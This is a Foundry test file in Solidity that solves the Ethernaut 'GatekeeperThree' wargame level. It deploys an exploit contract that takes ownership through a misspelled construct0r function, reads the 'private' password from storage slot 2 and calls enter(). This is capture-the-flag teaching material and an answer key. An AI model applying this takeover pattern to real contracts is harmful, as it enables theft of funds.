// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/GatekeeperThree/GatekeeperThree.sol";
import "levels/GatekeeperThree/GatekeeperThreeFactory.sol";
import "./utils/EthernautTest.sol";

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint256 password) external;
    function enter() external;
    function createTrick() external;
}

contract GatekeeperThreeHack {
    IGatekeeperThree public victim;

    constructor(address _targetAddress) {
        victim = IGatekeeperThree(_targetAddress);
    }

    function exploit(uint256 _password) external {
        // set us as owner
        victim.construct0r();
        // set allow_entrance to true
        victim.getAllowance(_password);
        victim.enter();
    }

    fallback() external {}
}

contract GatekeeperThreeTest is Test {
    function test_gatekeeperthree() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        GatekeeperThreeFactory gatekeeperThreeFactory = new GatekeeperThreeFactory();
        address levelAddress = ethernautTest.setup(gatekeeperThreeFactory);
        GatekeeperThree gateKeeperThree = GatekeeperThree(payable(levelAddress));
        gateKeeperThree.createTrick();

        // Exploit
        GatekeeperThreeHack gatekeeperThreeHack = new GatekeeperThreeHack(levelAddress);
        // Load password from storage slot 2
        uint256 password = uint256(bytes32(vm.load(address(gateKeeperThree.trick()), bytes32(uint256(2)))));
        // Send a bit of ether to the contract
        vm.deal(tx.origin, 0.0011 ether);
        payable(levelAddress).call{value: 0.0011 ether}("");
        gatekeeperThreeHack.exploit(password);

        // Submit
        ethernautTest.submit();
    }
}
